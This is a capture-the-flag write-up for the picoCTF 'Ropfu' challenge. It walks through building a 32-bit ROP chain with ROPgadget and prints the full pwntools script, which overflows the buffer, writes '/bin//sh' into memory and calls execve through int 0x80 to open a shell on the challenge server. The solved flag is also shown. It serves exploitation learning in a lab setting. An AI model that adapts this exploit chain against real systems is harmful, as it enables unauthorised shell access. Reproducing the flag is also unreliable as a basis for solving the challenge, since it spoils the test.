# Ropfu
 
## Challenge Description: What's ROP?

From the name of this challenge, it was pretty clear that ROP was needed to solve the challenge. Interestingly, the binary supplied was **32 bit** instead of **64 bit** in challenges that I've done before. Stitching the gadgets would be slightly different since 32 bit programs store their function parameters on the stack instead of the registers for 64 bit.

To solve the challenge, I performed the following: 
* Determined the offset of **28** from GEF
* Referred to this article on using **ROPGgadget**
* Used **--ropchain** from **ROPGgadget** to generated the payload 
* Made the following adjustments for a payload originally meant for *python2*
  * Imported python3's **pwn** library instead of python2's **struct**
  * Replaced **pack('<I', 0x080583c9)** with **p32(0x080583c9)**

The final payload is as follows: 
  
```python
from pwn import *

e = context.binary = ELF('./vuln', checksec=False)
r = remote('saturn.picoctf.net',56464)

offset = 28
p = b"A" * offset
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5060) # @ .data
p += p32(0x41414141) # padding
p += p32(0x080b074a) # pop eax ; ret
p += b'/bin'
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5064) # @ .data + 4
p += p32(0x41414141) # padding
p += p32(0x080b074a) # pop eax ; ret
p += b'//sh'
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x41414141) # padding
p += p32(0x0804fb90) # xor eax, eax ; ret
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x08049022) # pop ebx ; ret
p += p32(0x080e5060) # @ .data
p += p32(0x08049e39) # pop ecx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x080e5060) # padding without overwrite ebx
p += p32(0x0804fb90) # xor eax, eax ; ret

# eax needs to be incremented to 11 for the execve syscall
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret

# Invoke a system call and execute our code
p += p32(0x0804a3d2) # int 0x80

r.sendline(p)
r.interactive()
```

Running the payload above produced the flag.


FLAG: `picoCTF{5n47ch_7h3_5h311_c6992ff0}`

